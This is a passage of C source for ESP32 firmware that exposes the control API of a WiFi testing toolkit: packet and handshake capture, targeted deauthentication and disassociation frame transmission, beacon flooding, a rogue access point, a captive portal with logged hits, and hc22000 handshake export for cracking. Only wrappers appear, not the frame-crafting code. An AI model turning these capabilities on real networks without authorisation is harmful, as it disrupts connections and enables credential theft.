    omit_load();                /* prime the omit list before any parsing feeds the tables */
    if (s_mon_ap_ie == NULL) {  /* raw-IE store in PSRAM (off the scarce internal pool) */
        s_mon_ap_ie = heap_caps_calloc(MON_AP_MAX, sizeof(mon_ap_ie_t), MALLOC_CAP_SPIRAM);
        if (s_mon_ap_ie == NULL) ESP_LOGW(TAG, "raw-IE store alloc failed — detail shows no raw IEs");
    }
    s_autojoin = nocsif_settings_get_i32(K_AUTOJOIN, 1) != 0;   /* default: auto-join on */
    if (esp_read_mac(s_mac_factory, ESP_MAC_WIFI_STA) == ESP_OK) {
        s_mac_factory_ok = true;
        char s[18];             /* shows the factory MAC even before the radio is actually brought up */
        format_mac(s, sizeof s, s_mac_factory);
        publish_mac_str(s);
    }
    publish_status("off");
    publish_detail("WiFi off");
    clear_netinfo();

    s_q = xQueueCreate(WIFI_CMD_QLEN, sizeof(wifi_cmd_t));
    if (s_q == NULL) {
        ESP_LOGE(TAG, "failed to create command queue");
        return ESP_ERR_NO_MEM;
    }
    /* Priority is below the UI/system tasks; the event handlers do the
     * reactive work, so the worker mostly just blocks on its queue. Not
     * subscribed to the task watchdog, since there's no unbounded spin here. */
    if (xTaskCreate(wifi_task, "wifi", 4096, NULL, 4, &s_task) != pdPASS) {
        ESP_LOGE(TAG, "failed to create wifi worker task");
        vQueueDelete(s_q);
        s_q = NULL;
        s_task = NULL;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "wifi worker ready (lazy bring-up on first enable/scan)");
    return ESP_OK;
}

void nocsif_wifi_request_enable(bool on)      { post(on ? CMD_ENABLE : CMD_DISABLE, NULL, NULL); }
void nocsif_wifi_set_lean(bool lean)
{
    /* Before the worker even exists — main.c arms this at boot, ahead of
     * nocsif_wifi_init, so WiFi comes up lean from its very first init — the
     * flag is set directly, since post() would just drop it on the NULL
     * queue. */
    if (s_q == NULL) {
        s_lean = lean;
        return;
    }
    post(lean ? CMD_LEAN_ON : CMD_LEAN_OFF, NULL, NULL);
}
void nocsif_wifi_set_gateway_profile(bool on)
{
    /* Boot-time only: main.c arms this before nocsif_wifi_init when share is persisted. The buffer set is
     * fixed at the single esp_wifi_init, so a request once the driver is up is ignored (a reboot is needed
     * to apply it — the UI shows that hint). */
    if (s_driver_up) {
        ESP_LOGW(TAG, "gateway WiFi profile requested at runtime — ignored (fixed at init; %s this boot)",
                 s_gw_profile ? "GATEWAY" : "lean");
        return;
    }
    s_gw_profile = on;
    ESP_LOGI(TAG, "WiFi %s profile armed (applies at the next bring-up)", on ? "GATEWAY throughput" : "lean");
}
bool nocsif_wifi_gateway_profile_armed(void)  { return s_gw_profile; }
uint32_t nocsif_wifi_ntp_gen(void)            { return s_ntp_gen; }
bool nocsif_wifi_is_lean(void)                { return s_lean; }
void nocsif_wifi_request_scan(void)           { post(CMD_SCAN, NULL, NULL); }
void nocsif_wifi_request_connect(const char *ssid, const char *pass)
{
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflects "joining" the instant the UI asks */
    post(CMD_CONNECT, ssid, pass);
}
void nocsif_wifi_request_disconnect(void)     { post(CMD_DISCONNECT, NULL, NULL); }
void nocsif_wifi_request_rejoin(void)         { post(CMD_REJOIN, NULL, NULL); }
void nocsif_wifi_request_forget(void)         { post(CMD_FORGET, NULL, NULL); }

void nocsif_wifi_request_reconnect(void)
{
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflects "joining" the instant the UI asks */
    post(CMD_RECONNECT, NULL, NULL);
}
void nocsif_wifi_request_randomize_mac(void)  { post(CMD_RANDMAC, NULL, NULL); }
void nocsif_wifi_request_restore_mac(void)    { post(CMD_RESTMAC, NULL, NULL); }
void nocsif_wifi_apply_hostname(void)         { post(CMD_APPLY_HOST, NULL, NULL); }
void nocsif_wifi_request_set_mac(const uint8_t mac[6]) { if (mac) post_mac(mac); }
void nocsif_wifi_forget_ssid(const char *ssid)         { post(CMD_FORGET_SSID, ssid, NULL); }
void nocsif_wifi_connect_saved(const char *ssid)
{
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflects "joining" the instant the UI asks */
    post(CMD_CONNECT_SAVED, ssid, NULL);
}

void nocsif_wifi_set_autojoin(bool on)
{
    s_autojoin = on;
    nocsif_settings_set_i32(K_AUTOJOIN, on ? 1 : 0);
    ESP_LOGI(TAG, "auto-join %s", on ? "on" : "off");
}

/* ---- monitor mode requests (M5-P2) ---- */
void nocsif_wifi_request_monitor(bool on)          { post(on ? CMD_MONITOR_ON : CMD_MONITOR_OFF, NULL, NULL); }
void nocsif_wifi_request_monitor_hop(bool hop)     { post_i(CMD_MON_HOP, hop ? 1 : 0); }
void nocsif_wifi_request_monitor_channel(int ch)   { post_i(CMD_MON_CHAN, ch); }

/* ---- passive parser request (M5-P3) ---- */
void nocsif_wifi_request_parse(bool on)            { post(on ? CMD_PARSE_ON : CMD_PARSE_OFF, NULL, NULL); }

/* ---- PCAP capture request (M5-P3.3) ---- */
void nocsif_wifi_request_pcap(bool on)             { post(on ? CMD_PCAP_ON : CMD_PCAP_OFF, NULL, NULL); }
void nocsif_wifi_request_pcap_stream(bool on)      { post(on ? CMD_PCAP_STREAM_ON : CMD_PCAP_STREAM_OFF, NULL, NULL); }
void nocsif_wifi_request_hs_capture(bool on)       { post(on ? CMD_HS_ON : CMD_HS_OFF, NULL, NULL); }

/* ---- management-frame TX requests and state (M5-P5.1, active) ---- */
void nocsif_wifi_request_mgmt_tx(bool on)          { post(on ? CMD_MGMTTX_ON : CMD_MGMTTX_OFF, NULL, NULL); }
void nocsif_wifi_set_mgmt_target(const uint8_t bssid[6], int channel, const char *ssid) { post_target(bssid, channel, ssid); }
void nocsif_wifi_set_mgmt_disassoc(bool disassoc)  { s_tx_disassoc = disassoc; }
bool nocsif_wifi_mgmt_disassoc(void)               { return s_tx_disassoc; }
bool nocsif_wifi_mgmt_tx_active(void)              { return s_tx_active; }
bool nocsif_wifi_mgmt_has_target(void)             { return s_tx_have_target; }
uint32_t nocsif_wifi_mgmt_tx_count(void)           { return s_tx_count; }
uint32_t nocsif_wifi_mgmt_tx_rate(void)            { return s_tx_rate; }

const char *nocsif_wifi_mgmt_target_str(void)
{
    static char buf[64];
    if (!s_tx_have_target) {
        return "none";
    }
    snprintf(buf, sizeof buf, "%s \xC2\xB7 %02x:%02x:%02x:%02x:%02x:%02x \xC2\xB7 ch %d",
             s_tx_ssid[0] ? s_tx_ssid : "(hidden)",
             s_tx_bssid[0], s_tx_bssid[1], s_tx_bssid[2],
             s_tx_bssid[3], s_tx_bssid[4], s_tx_bssid[5], s_tx_channel);
    return buf;
}

const char *nocsif_wifi_mgmt_tx_tag_str(void)
{
    static char buf[16];
    if (s_tx_active) {
        snprintf(buf, sizeof buf, "%u/s", (unsigned)s_tx_rate);
        return buf;
    }
    return s_tx_have_target ? "armed" : "off";
}

/* ---- beacon TX requests and state (M5-P5.2, active; the list API is defined alongside the beacon TX code) ---- */
void nocsif_wifi_request_beacon(bool on)           { post(on ? CMD_BEACON_ON : CMD_BEACON_OFF, NULL, NULL); }
bool nocsif_wifi_beacon_active(void)               { return s_bcn_active; }
uint32_t nocsif_wifi_beacon_frames(void)           { return s_bcn_frames; }
uint32_t nocsif_wifi_beacon_rate(void)             { return s_bcn_rate; }

const char *nocsif_wifi_beacon_tag_str(void)
{
    static char buf[16];
    if (s_bcn_active) {
        snprintf(buf, sizeof buf, "%u/s", (unsigned)s_bcn_rate);
        return buf;
    }
    return s_bcn_cnt > 0 ? "ready" : "off";
}

/* ---- software AP requests, config, and state (M5-P5.3, active) ---- */
void nocsif_wifi_request_ap(bool on) { post(on ? CMD_AP_ON : CMD_AP_OFF, NULL, NULL); }

void nocsif_wifi_ap_set_ssid(const char *ssid)
{
    ap_cfg_ensure_loaded();
    if (!ssid || !ssid[0]) {
        return;
    }
    char clean[WIFI_SSID_MAX];
    snprintf(clean, sizeof clean, "%s", ssid);        /* truncates to 32 characters */
    portENTER_CRITICAL(&s_sap_mux);
    memcpy(s_ap_ssid, clean, sizeof clean);
    portEXIT_CRITICAL(&s_sap_mux);
    nocsif_settings_set_str(K_AP_SSID, clean);
    if (s_ap_active) { post(CMD_AP_ON, NULL, NULL); } /* re-applies live */
}

void nocsif_wifi_ap_set_channel(int channel)
{
    ap_cfg_ensure_loaded();
    if (channel < 1)  channel = 1;
    if (channel > 13) channel = 13;
    s_ap_channel = channel;
    nocsif_settings_set_i32(K_AP_CHAN, channel);
    if (s_ap_active) { post(CMD_AP_ON, NULL, NULL); }
}

void nocsif_wifi_ap_set_hidden(bool hidden)
{
    ap_cfg_ensure_loaded();
    s_ap_hidden = hidden;
    nocsif_settings_set_i32(K_AP_HIDDEN, hidden ? 1 : 0);
    if (s_ap_active) { post(CMD_AP_ON, NULL, NULL); }
}

bool        nocsif_wifi_ap_active(void)  { return s_ap_active; }
int         nocsif_wifi_ap_channel(void) { ap_cfg_ensure_loaded(); return s_ap_channel; }
bool        nocsif_wifi_ap_hidden(void)  { ap_cfg_ensure_loaded(); return s_ap_hidden; }
const char *nocsif_wifi_ap_ip_str(void)  { return s_ap_ip; }
uint32_t    nocsif_wifi_ap_gen(void)     { return s_ap_cli_gen; }

const char *nocsif_wifi_ap_ssid(void)
{
    ap_cfg_ensure_loaded();
    return s_ap_ssid;   /* module-owned; setter writes are at most 33 bytes, display-only for reading */
}

int nocsif_wifi_ap_client_count(void)
{
    int i = s_ap_cli_i;
    return s_ap_cli_cnt[i];
}

bool nocsif_wifi_ap_client_get(int idx, uint8_t mac[6], char *ip, size_t iplen, int8_t *rssi)
{
    int i = s_ap_cli_i;                 /* reads the published buffer lock-free */
    if (idx < 0 || idx >= s_ap_cli_cnt[i]) {
        return false;
    }
    if (mac) { memcpy(mac, s_ap_cli[i][idx].mac, 6); }
    if (ip && iplen) { snprintf(ip, iplen, "%s", s_ap_cli[i][idx].ip); }
    if (rssi) { *rssi = s_ap_cli[i][idx].rssi; }
    return true;
}

const char *nocsif_wifi_ap_tag_str(void)
{
    static char buf[16];
    if (s_ap_active) {
        int n = s_ap_cli_cnt[s_ap_cli_i];
        if (n <= 0) {
            return "on";
        }
        snprintf(buf, sizeof buf, "%d joined", n);
        return buf;
    }
    return "off";
}

/* ---- captive portal requests and state (M5-P5.4, active) ---- */
void     nocsif_wifi_request_portal(bool on) { post(on ? CMD_PORTAL_ON : CMD_PORTAL_OFF, NULL, NULL); }
void     nocsif_wifi_companion_set_cmd_handler(nocsif_companion_cmd_fn_t fn) { s_comp_cmd_fn = fn; }
void     nocsif_wifi_companion_set_menu_fn(nocsif_companion_json_fn_t fn)    { s_comp_menu_fn = fn; }
void     nocsif_wifi_companion_set_state_fn(nocsif_companion_json_fn_t fn)   { s_comp_state_fn = fn; }
void     nocsif_wifi_companion_set_touch_fn(nocsif_companion_touch_fn_t fn)  { s_comp_touch_fn = fn; }

/* section 4.15 desktop bridge: the same hooks, but over the USB console, with no companion surface required */
bool nocsif_wifi_companion_dispatch(const nocsif_companion_cmd_t *cmd)
{
    if (!s_comp_cmd_fn || !cmd) return false;
    ESP_LOGI(TAG, "bridge cmd: type=%d arg=\"%s\"", (int)cmd->type, cmd->arg);
    s_comp_cmd_fn(cmd);
    return true;
}
bool nocsif_wifi_companion_menu_json(char *buf, size_t len)
{
    if (!s_comp_menu_fn || !buf || len == 0) return false;
    buf[0] = '\0';
    s_comp_menu_fn(buf, len);
    return buf[0] != '\0';
}
bool nocsif_wifi_companion_state_json(char *buf, size_t len)
{
    if (!s_comp_state_fn || !buf || len == 0) return false;
    buf[0] = '\0';
    s_comp_state_fn(buf, len);
    return buf[0] != '\0';
}
bool nocsif_wifi_companion_touch(int x, int y, int pressed)
{
    if (!s_comp_touch_fn) return false;
    s_comp_touch_fn(x, y, pressed);
    return true;
}
bool     nocsif_wifi_portal_active(void)     { return s_portal_active; }
uint32_t nocsif_wifi_portal_hits(void)       { return s_portal_hits; }
uint32_t nocsif_wifi_portal_gen(void)        { return s_portal_gen; }

const char *nocsif_wifi_portal_page_src(void)
{
    if (!s_portal_active || !s_portal_page_tried) {
        return "";
    }
    return (s_portal_page && s_portal_page_len > 0) ? "sd" : "built-in";
}

int nocsif_wifi_portal_log_count(void)
{
    int c;
    portENTER_CRITICAL(&s_portal_mux);
    c = s_portal_log_cnt;
    portEXIT_CRITICAL(&s_portal_mux);
    return c;
}

bool nocsif_wifi_portal_log_get(int idx, char *out, size_t len)
{
    bool ok = false;
    portENTER_CRITICAL(&s_portal_mux);
    if (idx >= 0 && idx < s_portal_log_cnt) {           /* idx 0 is the newest */
        int slot = (s_portal_log_head - 1 - idx + PORTAL_LOG_MAX * 2) % PORTAL_LOG_MAX;
        if (out && len) { snprintf(out, len, "%s", s_portal_log[slot]); }
        ok = true;
    }
    portEXIT_CRITICAL(&s_portal_mux);
    return ok;
}

const char *nocsif_wifi_portal_tag_str(void)
{
    static char buf[16];
    if (s_portal_active) {
        uint32_t h = s_portal_hits;
        if (h == 0) {
            return "on";
        }
        snprintf(buf, sizeof buf, "%u hits", (unsigned)h);
        return buf;
    }
    return "off";
}

/* The chosen landing-page filename; "" means the built-in notice. Module-owned, safe on the LVGL task. */
const char *nocsif_wifi_portal_selected_page(void)
{
    portal_sel_ensure_loaded();
    return s_portal_page_sel;
}

/* Selects the landing page by filename — a name under
 * /sd/nocsif/wifi/portals/, or "" for the built-in notice. Cached and
 * persisted; a running portal re-serves it right away. Safe on the LVGL
 * task. */
void nocsif_wifi_portal_set_page(const char *name)
{
    portal_sel_ensure_loaded();
    char clean[PT_SEL_MAX];
    snprintf(clean, sizeof clean, "%s", name ? name : "");
    portENTER_CRITICAL(&s_portal_mux);
    memcpy(s_portal_page_sel, clean, sizeof clean);
    portEXIT_CRITICAL(&s_portal_mux);
    nocsif_settings_set_str(K_PT_PAGE, clean);
    if (s_portal_active) { post(CMD_PORTAL_RELOAD, NULL, NULL); }
}

/* ---- hc22000 export request and state (M5 passive polish) ---- */
void nocsif_wifi_request_export_hc22000(void) { post(CMD_EXPORT_HC, NULL, NULL); }
const char *nocsif_wifi_hc_path(void)         { return s_hc_path; }

const char *nocsif_wifi_hc_status_str(void)
{
    static char buf[48];
    switch (s_hc_state) {
        case HC_BUSY:      return "exporting\xE2\x80\xA6";
        case HC_DONE:      snprintf(buf, sizeof buf, "%d line%s written",
                                    s_hc_lines, s_hc_lines == 1 ? "" : "s"); return buf;
        case HC_NOSD:      return "no microSD card";
        case HC_FILESHARE: return "SD busy (File Share)";
        case HC_ERR:       return "export error";
        default:           return "";
    }
}
